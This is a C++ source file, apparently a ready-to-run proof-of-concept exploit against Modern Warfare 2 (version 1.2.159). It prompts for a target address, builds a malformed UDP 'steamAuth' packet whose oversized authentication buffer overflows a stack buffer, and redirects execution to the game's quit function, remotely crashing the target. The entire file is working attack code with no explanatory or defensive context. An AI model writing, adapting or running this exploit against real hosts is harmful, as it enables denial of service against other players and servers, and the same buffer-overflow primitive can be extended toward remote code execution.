#pragma comment (lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <vector>
#include <iostream>

bool resolve_address(sockaddr_in* address, std::string target)
{
	std::string port = "28960";
	auto pos = target.find_first_of(":");
	if (pos != std::string::npos)
	{
		port = target.substr(pos + 1);
		target = target.substr(0, pos);
	}

	addrinfo hints;
	addrinfo *result = NULL;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;

	getaddrinfo(target.data(), NULL, &hints, &result);

	if (!result)
	{
		return false;
	}

	*address = *(sockaddr_in*)result->ai_addr;
	address->sin_port = htons(static_cast<unsigned short>(atoi(port.data())));
	freeaddrinfo(result);

	return true;
}

bool read_address(sockaddr_in* address)
{
	std::string target;
	std::cout << "Enter the address of your target:" << std::endl;
	std::cin >> target;

	if (target.empty())
	{
		return false;
	}

	if (!resolve_address(address, target))
	{
		std::cout << "Resolving address failed!" << std::endl;
		return false;
	}

	return true;
}

std::string build_payload()
{
	// Construct virtual stack
	std::vector<DWORD> stack;
	stack.push_back(0x4D4000); // Com_Quit_f - (MW2 1.2.159)

	// Build the malicious packet
	std::string data = "\xFF\xFF\xFF\xFF" "steamAuth";
	data.push_back(0);
	data.append("aaaaaaaa", 8); // Guid

	std::string authBuffer;
	authBuffer.resize(0x800); // Overflow the buffer

	// Append stack to authentication buffer
	authBuffer.append((char*)stack.data(), stack.size() * 4);

	unsigned short size = authBuffer.size();
	data.append((char*)&size, 2);
	data.append((char*)authBuffer.data(), authBuffer.size());

	return data;
}

void send_to_address(const sockaddr_in& address, const std::string& data)
{
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	sendto(sock, data.data(), data.size(), 0, reinterpret_cast<const SOCKADDR *>(&address), sizeof(address));
	closesocket(sock);
}

int main(int /*argc*/, char /*argv*/[])
{
	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2, 2), &wsa_data);

	sockaddr_in address;
	if (!read_address(&address)) return 1;

	std::string payload = build_payload();

	send_to_address(address, payload);

	WSACleanup();
	return 0;
}
